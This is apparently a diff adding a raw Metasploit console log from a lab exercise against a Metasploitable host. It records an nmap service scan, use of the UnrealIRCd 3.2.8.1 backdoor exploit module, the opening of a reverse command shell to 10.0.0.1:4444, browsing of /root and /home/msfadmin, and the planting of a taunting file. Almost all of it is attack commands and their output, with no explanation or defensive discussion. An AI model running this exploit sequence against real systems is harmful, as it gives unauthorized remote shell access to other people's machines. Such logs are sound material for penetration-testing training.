@@ -1,0 +1,96 @@
+msf> nmap 10.0.0.2 -sV -p 6667
+[*] exec: nmap 10.0.0.2 -sV -p 6667
+
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2016-06-20 10:23 EDT
+Nmap scan report for 10.0.0.2
+Host is up (0.0012s latency).
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     Unreal ircd
+MAC Address: 08:00:27:67:80:33 (Cadmus Computer Systems)
+Service Info: Host: irc.Metasploitable.LAN
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
+
+msf> search unreal
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date          Rank       Description
+   ----                                        ---------------          ----       -----------
+   exploit/linux/games/ut2004_secure           2004-06-18 00:00:00 UTC  good       Unreal Tournament 2004 "secure" Overflow (Linux)
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12 00:00:00 UTC  excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
+   exploit/windows/games/ut2004_secure         2004-06-18 00:00:00 UTC  good       Unreal Tournament 2004 "secure" Overflow (Win32)
+
+
+msf> use exploit/unix/irc
+[-] Failed to load module: exploit/unix/irc
+msf> use exploit/unix/irc/unreal_ircd_3281_backdoor 
+msf exploit(unreal_ircd_3281_backdoor) > set RHOST 10.0.0.2
+RHOST => 10.0.0.2
+msf exploit(unreal_ircd_3281_backdoor) > set THREADS 4
+THREADS => 4
+msf exploit(unreal_ircd_3281_backdoor) > exploit
+
+[*] Started reverse double handler
+[*] Connected to 10.0.0.2:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo HyuJohFmWYlWPv7z;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "HyuJohFmWYlWPv7z\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.0.0.1:4444 -> 10.0.0.2:37374) at 2016-06-20 10:28:23 -0400
+
+ls
+Donation
+LICENSE
+aliases
+badwords.channel.conf
+badwords.message.conf
+badwords.quit.conf
+curl-ca-bundle.crt
+dccallow.conf
+doc
+help.conf
+ircd.log
+ircd.pid
+ircd.tune
+modules
+networks
+spamfilter.conf
+tmp
+unreal
+unrealircd.conf
+
+cd ~
+pwd
+/root
+cd /home/msfadmin
+ls
+server
+server.c
+server2
+server3
+vulnerable
+
+
+cat > EVIL_HAS_WON 
+AHAHAHAAA
+
+^C
+Abort session 1? [y/N]  y
+
+[*] 10.0.0.2 - Command shell session 1 closed.  Reason: User exit
+msf exploit(unreal_ircd_3281_backdoor) > 
+msf exploit(unreal_ircd_3281_backdoor) > back
+msf> 
